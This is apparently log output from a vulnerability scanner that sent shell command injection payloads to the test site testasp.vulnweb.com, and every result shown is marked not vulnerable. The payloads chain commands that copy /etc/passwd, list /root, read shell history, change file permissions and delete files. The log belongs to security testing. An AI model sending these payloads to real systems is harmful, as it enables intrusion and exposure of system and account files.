+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
